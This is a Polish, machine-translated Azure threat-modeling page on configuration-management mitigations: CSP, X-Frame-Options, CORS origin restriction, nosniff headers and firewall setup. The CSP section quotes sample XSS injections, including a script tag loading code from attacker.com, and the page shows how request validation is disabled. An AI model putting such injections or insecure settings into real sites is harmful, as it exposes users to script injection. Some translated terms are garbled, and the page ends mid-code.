---
title: Zarządzanie konfiguracją narzędzia Microsoft Threat Modeling Tool
titleSuffix: Azure
description: zagrożeniach ujawnionych w narzędziu do modelowania zagrożeń
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.subservice: security-develop
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.openlocfilehash: ead6a79109c221d31ead96a202e97294ef218c5f
ms.sourcegitcommit: acb82fc770128234f2e9222939826e3ade3a2a28
ms.translationtype: MT
ms.contentlocale: pl-PL
ms.lasthandoff: 04/21/2020
ms.locfileid: "81687978"
---
# <a name="security-frame-configuration-management--mitigations"></a>Rama zabezpieczeń: Zarządzanie konfiguracją | Czynniki 
| Produkt/usługa | Artykuł |
| --------------- | ------- |
| **Aplikacja internetowa** | <ul><li>[Implementuj zasady zabezpieczeń zawartości (CSP) i wyłącz wbudowany javascript](#csp-js)</li><li>[Włącz filtr XSS przeglądarki](#xss-filter)</li><li>[ASP.NET aplikacje muszą wyłączyć śledzenie i debugowanie przed wdrożeniem](#trace-deploy)</li><li>[Dostęp do skryptów JavaScript innych firm tylko z zaufanych źródeł](#js-trusted)</li><li>[Upewnij się, że uwierzytelnione ASP.NET strony zawierają mechanizmy odwoławcze interfejsu użytkownika lub mechanizmy obronne za pomocą zatrzasków](#ui-defenses)</li><li>[Upewnij się, że tylko zaufane źródła są dozwolone, jeśli funkcja CORS jest włączona w aplikacji ASP.NET Web Applications](#cors-aspnet)</li><li>[Włącz atrybut ValidateRequest na stronach ASP.NET](#validate-aspnet)</li><li>[Korzystanie z lokalnie hostowanych najnowszych wersji bibliotek JavaScript](#local-js)</li><li>[Wyłącz automatyczne wąchanie MIME](#mime-sniff)</li><li>[Usuwanie standardowych nagłówków serwerów w witrynach sieci Web systemu Windows Azure w celu uniknięcia pobierania odcisków palców](#standard-finger)</li></ul> |
| **baza danych** | <ul><li>[Konfigurowanie Zapory systemu Windows dla dostępu do aparatu bazy danych](#firewall-db)</li></ul> |
| **Interfejs API sieci Web** | <ul><li>[Upewnij się, że tylko zaufane źródła są dozwolone, jeśli usługa CORS jest włączona w ASP.NET interfejsie API sieci Web](#cors-api)</li><li>[Szyfrowanie sekcji plików konfiguracyjnych interfejsu API sieci Web zawierających poufne dane](#config-sensitive)</li></ul> |
| **Urządzenie IoT** | <ul><li>[Upewnij się, że wszystkie interfejsy administratora są zabezpieczone silnymi poświadczeniami](#admin-strong)</li><li>[Upewnij się, że nieznany kod nie może wykonać na urządzeniach](#unknown-exe)</li><li>[Szyfruj system operacyjny i dodatkowe partycje urządzenia IoT za pomocą bit-lockera](#partition-iot)</li><li>[Upewnij się, że tylko minimalne usługi/funkcje są włączone na urządzeniach](#min-enable)</li></ul> |
| **Brama pola IoT** | <ul><li>[Szyfruj system operacyjny i dodatkowe partycje bramy pola IoT za pomocą bit-lockera](#field-bit-locker)</li><li>[Upewnij się, że domyślne dane logowania bramy polowej zostały zmienione podczas instalacji](#default-change)</li></ul> |
| **Brama w chmurze IoT** | <ul><li>[Upewnij się, że usługa Cloud Gateway implementuje proces, aby oprogramowanie układowe podłączonych urządzeń było aktualne](#cloud-firmware)</li></ul> |
| **Granica zaufania maszyny** | <ul><li>[Upewnij się, że urządzenia mają skonfigurowane mechanizmy kontroli zabezpieczeń punktu końcowego zgodnie z zasadami organizacyjnymi](#controls-policies)</li></ul> |
| **Azure Storage** | <ul><li>[Zapewnienie bezpiecznego zarządzania kluczami dostępu do magazynu platformy Azure](#secure-keys)</li><li>[Upewnij się, że tylko zaufane źródła są dozwolone, jeśli usługa CORS jest włączona w magazynie platformy Azure](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Włącz funkcję ograniczania przepustowości usług WCF](#throttling)</li><li>[WCF-Ujawnienie informacji za pośrednictwem metadanych](#info-metadata)</li></ul> | 

## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>Implementuj zasady zabezpieczeń zawartości (CSP) i wyłącz wbudowany javascript

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | [Wprowadzenie do zasad zabezpieczeń zawartości,](https://www.html5rocks.com/en/tutorials/security/content-security-policy/) [odwołanie do zasad zabezpieczeń zawartości,](https://content-security-policy.com/) [funkcje zabezpieczeń,](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/) [Wprowadzenie do zasad zabezpieczeń zawartości](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), Czy mogę używać dostawcy dostawcy [csp?](https://caniuse.com/#feat=contentsecuritypolicy) |
| **Kroki** | <p>Content Security Policy (CSP) to mechanizm zabezpieczeń obrony w głębi, standard W3C, który umożliwia właścicielom aplikacji sieci web mieć kontrolę nad zawartością osadzoną w ich witrynie. Protokół CSP jest dodawany jako nagłówek odpowiedzi HTTP na serwerze sieci web i jest wymuszany po stronie klienta przez przeglądarki. Jest to zasada oparta na białej liście — witryna sieci Web może deklarować zestaw zaufanych domen, z których można ładować aktywną zawartość, taką jak JavaScript.</p><p>Usługa CSP zapewnia następujące korzyści w zakresie zabezpieczeń:</p><ul><li>**Ochrona przed XSS:** Jeśli strona jest narażona na XSS, osoba atakująca może wykorzystać ją na dwa sposoby:<ul><li>Wstrzyknąć `<script>malicious code</script>`. Ten exploit nie będzie działać z powodu ograniczenia bazowego CSP-1</li><li>Wstrzyknąć `<script src="http://attacker.com/maliciousCode.js"/>`. Ten exploit nie będzie działać, ponieważ domena kontrolowana przez osobę atakującą nie będzie na białej liście domen CSP</li></ul></li><li>**Kontrola nad eksfiltracją danych:** Jeśli złośliwa zawartość na stronie sieci Web próbuje połączyć się z zewnętrzną witryną sieci Web i wykraść dane, połączenie zostanie przerwane przez CSP. Dzieje się tak dlatego, że domena docelowa nie znajdzie się na białej liście CSP</li><li>**Obrona przed kliknięciem:** click-jacking jest techniką ataku, za pomocą której przeciwnik może wykadrować prawdziwą stronę internetową i zmusić użytkowników do kliknięcia elementów interfejsu użytkownika. Obecnie obrony przed click-jacking uzyskuje się poprzez skonfigurowanie nagłówka odpowiedzi- X-Frame-Options. Nie wszystkie przeglądarki respektują ten nagłówek i idąc dalej CSP będzie standardowym sposobem obrony przed zatrzaskami</li><li>**Raportowanie ataków w czasie rzeczywistym:** Jeśli na stronie internetowej obsługującej protokół CSP występuje atak iniekcyjny, przeglądarki automatycznie wyzwolą powiadomienie do punktu końcowego skonfigurowanego na serwerze internetowym. W ten sposób CSP służy jako system ostrzegania w czasie rzeczywistym.</li></ul> |

### <a name="example"></a>Przykład
Przykładowa zasada: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Ta zasada umożliwia ładowanie skryptów tylko z serwera aplikacji internetowej i serwera Google Analytics. Skrypty załadowane z dowolnej innej witryny zostaną odrzucone. Gdy CSP jest włączona w witrynie sieci Web, następujące funkcje są automatycznie wyłączone w celu złagodzenia ataków XSS. 

### <a name="example"></a>Przykład
Skrypty wbudowane nie będą wykonywane. Oto przykłady skryptów wbudowanych 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
javascript:alert(1);
```

### <a name="example"></a>Przykład
Ciągi nie będą oceniane jako kod. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a name="enable-browsers-xss-filter"></a><a id="xss-filter"></a>Włącz filtr XSS przeglądarki

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | [Filtr ochrony XSS](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
| **Kroki** | <p>Konfiguracja nagłówka odpowiedzi X-XSS-Protection steruje filtrem skryptów między witrynami przeglądarki. Ten nagłówek odpowiedzi może mieć następujące wartości:</p><ul><li>`0:`Spowoduje to wyłączenie filtru</li><li>`1: Filter enabled`Jeśli zostanie wykryty atak skryptów krzyżowych, aby zatrzymać atak, przeglądarka zdezynfekuje stronę</li><li>`1: mode=block : Filter enabled`. Zamiast dezynfekować stronę, po wykryciu ataku XSS przeglądarka uniemożliwi renderowanie strony</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Przeglądarka zdezynfekuje stronę i zgłosi naruszenie.</li></ul><p>Jest to funkcja Chromium wykorzystująca raporty o naruszeniu CSP, aby wysłać szczegóły do wybranego identyfikatora URI. Ostatnie 2 opcje są uważane za bezpieczne wartości.</p>|

## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>ASP.NET aplikacje muszą wyłączyć śledzenie i debugowanie przed wdrożeniem

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | [ASP.NET Debugowanie Omówienie](https://msdn.microsoft.com/library/ms227556.aspx), [ASP.NET Przegląd śledzenia](https://msdn.microsoft.com/library/bb386420.aspx), [Jak: Włącz śledzenie dla aplikacji ASP.NET](https://msdn.microsoft.com/library/0x5wc973.aspx), [Jak: Włącz debugowanie dla aplikacji ASP.NET](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Kroki** | Gdy śledzenie jest włączone dla strony, każda przeglądarka żądająca go uzyskuje również informacje śledzenia, który zawiera dane dotyczące wewnętrznego stanu serwera i przepływu pracy. Informacje te mogą być wrażliwe na bezpieczeństwo. Gdy debugowanie jest włączone dla strony, błędy dzieje się na serwerze spowodować pełne dane śledzenia stosu przedstawione w przeglądarce. Te dane mogą ujawniać informacje o zabezpieczeniach przepływu pracy serwera. |

## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>Dostęp do skryptów JavaScript innych firm tylko z zaufanych źródeł

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | Nie dotyczy  |
| **Kroki** | JavaScripty innych firm powinny być odwoływane tylko z zaufanych źródeł. Punkty końcowe odwołania powinny być zawsze na SSL. |

## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Upewnij się, że uwierzytelnione ASP.NET strony zawierają mechanizmy odwoławcze interfejsu użytkownika lub mechanizmy obronne za pomocą zatrzasków

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | [OWASP kliknij jacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), [IE Internals - Zwalczanie click-jacking z X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
| **Kroki** | <p>kliknięcie, znane również jako "atak zadośćuczynienia interfejsu użytkownika", jest wtedy, gdy osoba atakująca używa wielu przezroczystych lub nieprzejrzystych warstw, aby skłonić użytkownika do kliknięcia przycisku lub łącza na innej stronie, gdy zamierzał kliknąć na stronie najwyższego poziomu.</p><p>To nakładanie warstw odbywa się poprzez stworzenie złośliwej strony z elementem iframe, który ładuje stronę ofiary. W związku z tym osoba atakująca jest "porwanie" kliknięć przeznaczonych dla ich strony i routingu je do innej strony, najprawdopodobniej własnością innej aplikacji, domeny lub obu. Aby zapobiec atakom typu click-jacking, ustaw odpowiednie nagłówki odpowiedzi HTTP z opcjami X-Frame- Options, które instruują przeglądarkę, aby nie zezwalała na kadrowanie z innych domen</p>|

### <a name="example"></a>Przykład
Nagłówek X-FRAME-OPTIONS można ustawić za pośrednictwem witryny IIS web.config. Fragment kodu web.config dla witryn, które nigdy nie powinny być oprawione w ramkę: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Przykład
Web.config kod dla witryn, które powinny być otoczone tylko przez strony w tej samej domenie: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-applications"></a><a id="cors-aspnet"></a>Upewnij się, że tylko zaufane źródła są dozwolone, jeśli funkcja CORS jest włączona w aplikacji ASP.NET Web Applications

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Formularze internetowe, MVC5 |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | Nie dotyczy  |
| **Kroki** | <p>Zabezpieczenia przeglądarki uniemożliwiają stronie internetowej wysyłanie żądań AJAX do innej domeny. To ograniczenie jest nazywane zasadami tego samego źródła i uniemożliwia złośliwej witrynie odczytywanie poufnych danych z innej witryny. Jednak czasami może być wymagane do udostępnienia interfejsów API bezpiecznie, które inne witryny mogą korzystać. Cross Origin Resource Sharing (CORS) to standard W3C, który umożliwia serwerowi rozluźnienie zasad tego samego źródła. Za pomocą mechanizmu CORS, serwer może jawnie zezwolić na niektóre żądania cross-origin podczas odrzucania innych.</p><p>CORS jest bezpieczniejszy i bardziej elastyczny niż wcześniejsze techniki, takie jak JSONP. W swej istocie włączenie cors przekłada się na dodanie kilku nagłówków odpowiedzi HTTP (Kontrola dostępu-*) do aplikacji sieci web i można to zrobić na kilka sposobów.</p>|

### <a name="example"></a>Przykład
Jeśli dostęp do witryny Web.config jest dostępny, cors można dodać za pomocą następującego kodu: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Przykład
Jeśli dostęp do web.config nie jest dostępny, cors można skonfigurować, dodając następujący kod CSharp: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

Należy pamiętać, że ważne jest, aby upewnić się, że lista źródeł w "Access-Control-Allow-Origin" atrybut jest ustawiona na skończony i zaufany zestaw pochodzenia. Nieskonfigurowanie tego w niewłaściwy sposób (np. ustawienie wartości jako "*") umożliwi złośliwym witrynom wyzwalanie żądań między źródłami do aplikacji sieci web >bez żadnych ograniczeń, co spowoduje, że aplikacja będzie narażona na ataki CSRF. 

## <a name="enable-validaterequest-attribute-on-aspnet-pages"></a><a id="validate-aspnet"></a>Włącz atrybut ValidateRequest na stronach ASP.NET

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Formularze internetowe, MVC5 |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | [Żądanie weryfikacji — zapobieganie atakom skryptów](https://www.asp.net/whitepapers/request-validation) |
| **Kroki** | <p>Sprawdzanie poprawności żądania, funkcja ASP.NET od wersji 1.1, uniemożliwia serwerowi akceptowanie zawartości zawierającej niezakodowany kod HTML. Ta funkcja ma na celu zapobieganie niektórym atakom iniekcji skryptów, w których kod skryptu klienta lub kod HTML może być nieświadomie przesłany do serwera, przechowywany, a następnie prezentowany innym użytkownikom. Nadal zdecydowanie zaleca się sprawdzenie poprawności wszystkich danych wejściowych i kodowanie html go w razie potrzeby.</p><p>Sprawdzanie poprawności żądania jest wykonywane przez porównanie wszystkich danych wejściowych z listą potencjalnie niebezpiecznych wartości. Jeśli dojdzie do dopasowania, ASP.NET podnoszą . `HttpRequestValidationException` Domyślnie funkcja sprawdzania poprawności żądania jest włączona.</p>|

### <a name="example"></a>Przykład
Jednak ta funkcja może być wyłączona na poziomie strony: 
```XML
<%@ Page validateRequest="false" %> 
```
lub, na poziomie aplikacji 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Należy pamiętać, że funkcja sprawdzania poprawności żądania nie jest obsługiwana i nie jest częścią potoku MVC6. 

## <a name="use-locally-hosted-latest-versions-of-javascript-libraries"></a><a id="local-js"></a>Korzystanie z lokalnie hostowanych najnowszych wersji bibliotek JavaScript

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | Nie dotyczy  |
| **Kroki** | <p>Deweloperzy korzystający ze standardowych bibliotek JavaScript, takich jak JQuery, muszą używać zatwierdzonych wersji popularnych bibliotek JavaScript, które nie zawierają znanych wad zabezpieczeń. Dobrą praktyką jest użycie najnowszej wersji bibliotek, ponieważ zawierają one poprawki zabezpieczeń dotyczące znanych luk w zabezpieczeniach w ich starszych wersjach.</p><p>Jeśli najnowszej wersji nie można użyć ze względu na zgodność, należy użyć poniższych wersji minimalnych.</p><p>Dopuszczalne wersje minimalne:</p><ul><li>**Jquery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Sprawdź poprawność 1.9</li><li>JQuery Mobile 1.0.1</li><li>Cykl JQuery 2,99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Ajax Control Toolkit**<ul><li>Zestaw narzędzi sterowania Ajax 40412</li></ul></li><li>**ASP.NET formularzy sieci Web i Ajax**<ul><li>ASP.NET Web Forms i AJAX 4</li><li>ASP.NET AJAX 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Nigdy nie ładuj żadnej biblioteki JavaScript z witryn zewnętrznych, takich jak publiczne sieci CDN</p>|

## <a name="disable-automatic-mime-sniffing"></a><a id="mime-sniff"></a>Wyłącz automatyczne wąchanie MIME

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | [IE8 Security Część V: Kompleksowa ochrona,](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx) [typ MIME](https://en.wikipedia.org/wiki/Mime_type) |
| **Kroki** | Nagłówek X-Content-Type-Options jest nagłówkiem HTTP, który umożliwia deweloperom określenie, że ich zawartość nie powinna być wąchaniem MIME. Ten nagłówek jest przeznaczony do łagodzenia ataków MIME-Sniffing. Dla każdej strony, która może zawierać zawartość kontrolowaną przez użytkownika, należy użyć nagłówka HTTP X-Content-Type-Options:nosniff. Aby globalnie włączyć wymagany nagłówek dla wszystkich stron w aplikacji, można wykonać jedną z następujących czynności:|

### <a name="example"></a>Przykład
Dodaj nagłówek w pliku web.config, jeśli aplikacja jest obsługiwana przez internetowe usługi informacyjne (IIS) 7. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Przykład
Dodawanie nagłówka za\_pośrednictwem globalnego application BeginRequest 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Przykład
Implementowanie niestandardowego modułu HTTP 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Przykład
Wymagany nagłówek można włączyć tylko dla określonych stron, dodając go do poszczególnych odpowiedzi: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a name="remove-standard-server-headers-on-windows-azure-web-sites-to-avoid-fingerprinting"></a><a id="standard-finger"></a>Usuwanie standardowych nagłówków serwerów w witrynach sieci Web systemu Windows Azure w celu uniknięcia pobierania odcisków palców

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Typ środowiska — platforma Azure |
| **Dokumentacja**              | [Usuwanie standardowych nagłówków serwerów w witrynach sieci Web systemu Windows Azure](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Kroki** | Nagłówki, takie jak Serwer, X-Powered-By, X-AspNet-Version ujawniają informacje o serwerze i podstawowych technologiach. Zaleca się wyłączenie tych nagłówków, uniemożliwiając w ten sposób pobieranie odcisków palców |

## <a name="configure-a-windows-firewall-for-database-engine-access"></a><a id="firewall-db"></a>Konfigurowanie Zapory systemu Windows dla dostępu do aparatu bazy danych

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | baza danych | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | SQL Azure, OnPrem |
| **Atrybuty**              | Nie dotyczy wersji SQL - V12 |
| **Dokumentacja**              | [Jak skonfigurować zaporę bazy danych SQL platformy Azure](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [Konfigurowanie Zapory systemu Windows dla dostępu do aparatu bazy danych](https://msdn.microsoft.com/library/ms175043) |
| **Kroki** | Systemy zapory zapobiegają nieautoryzowanemu dostępowi do zasobów komputera. Aby uzyskać dostęp do wystąpienia aparatu bazy danych programu SQL Server za pośrednictwem zapory, należy skonfigurować zaporę na komputerze z systemem SQL Server, aby zezwolić na dostęp |

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-api"></a><a id="cors-api"></a>Upewnij się, że tylko zaufane źródła są dozwolone, jeśli usługa CORS jest włączona w ASP.NET interfejsie API sieci Web

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Interfejs API sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | MVC 5 |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | [Włączanie żądań między źródłami w interfejsie API sieci Web 2 ASP.NET](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api) [interfejsu API sieci Web ASP.NET — obsługa cors w interfejsie API sieci Web ASP.NET 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Kroki** | <p>Zabezpieczenia przeglądarki uniemożliwiają stronie internetowej wysyłanie żądań AJAX do innej domeny. To ograniczenie jest nazywane zasadami tego samego źródła i uniemożliwia złośliwej witrynie odczytywanie poufnych danych z innej witryny. Jednak czasami może być wymagane do udostępnienia interfejsów API bezpiecznie, które inne witryny mogą korzystać. Cross Origin Resource Sharing (CORS) to standard W3C, który umożliwia serwerowi rozluźnienie zasad tego samego źródła.</p><p>Za pomocą mechanizmu CORS, serwer może jawnie zezwolić na niektóre żądania cross-origin podczas odrzucania innych. CORS jest bezpieczniejszy i bardziej elastyczny niż wcześniejsze techniki, takie jak JSONP.</p>|

### <a name="example"></a>Przykład
W App_Start/WebApiConfig.cs dodaj następujący kod do metody WebApiConfig.Register 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Przykład
Atrybut EnableCors można zastosować do metod akcji w kontrolerze w następujący sposób: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Należy pamiętać, że ważne jest, aby upewnić się, że lista źródeł w EnableCors atrybut jest ustawiona na skończony i zaufany zestaw źródeł. Nieskonfigurowanie tego w niewłaściwy sposób (np. ustawienie wartości jako "*") umożliwi złośliwym witrynom wyzwalanie żądań krzyżowego pochodzenia do interfejsu API bez żadnych ograniczeń, >tym samym narażanie interfejsu API na ataki CSRF. EnableCors mogą być dekorowane na poziomie kontrolera. 

### <a name="example"></a>Przykład
Aby wyłączyć cors dla określonej metody w klasie, DisableCors atrybut może służyć, jak pokazano poniżej: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Interfejs API sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | MVC 6 |
| **Atrybuty**              | Nie dotyczy  |
| **Dokumentacja**              | [Włączanie żądań między źródłami (CORS) w ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
| **Kroki** | <p>W ASP.NET Core 1.0 można włączyć cors za pomocą oprogramowania pośredniczącego lub przy użyciu MVC. Podczas korzystania z MVC, aby włączyć CORS te same usługi CORS są używane, ale oprogramowanie pośredniczące CORS nie jest.</p>|

**Podejście 1** Włączanie cors z oprogramowaniem pośredniczącym: Aby włączyć CORS dla całej aplikacji dodać oprogramowanie pośredniczące CORS do potoku żądania przy użyciu UseCors metody rozszerzenia. Zasady cross-origin można określić podczas dodawania oprogramowania pośredniczącego CORS przy użyciu corsPolicyBuilder klasy. Istnieją dwa sposoby wykonania tej czynności:

### <a name="example"></a>Przykład
Pierwszym z nich jest wywołanie UseCors z lambda. Lambda zajmuje CorsPolicyBuilder obiektu: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Przykład
Drugim jest zdefiniowanie jednej lub więcej nazwanych zasad CORS, a następnie wybranie zasad według nazwy w czasie wykonywania. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Podejście-2** Włączanie cors w MVC: Deweloperzy mogą alternatywnie używać MVC do stosowania określonych CORS na akcję, na kontroler lub globalnie dla wszystkich kontrolerów.

### <a name="example"></a>Przykład
Dla akcji: Aby określić zasady CORS dla określonej akcji, dodaj do akcji atrybut [EnableCors]. Określ nazwę zasad. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Przykład
Na kontroler: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Przykład
Globalnie: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Należy pamiętać, że ważne jest, aby upewnić się, że lista źródeł w EnableCors atrybut jest ustawiona na skończony i zaufany zestaw źródeł. Nieskonfigurowanie tego w niewłaściwy sposób (np. ustawienie wartości jako "*") umożliwi złośliwym witrynom wyzwalanie żądań krzyżowego pochodzenia do interfejsu API bez żadnych ograniczeń, >tym samym narażanie interfejsu API na ataki CSRF. 

### <a name="example"></a>Przykład
Aby wyłączyć cors dla kontrolera lub akcji, użyj [DisableCors] atrybut. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
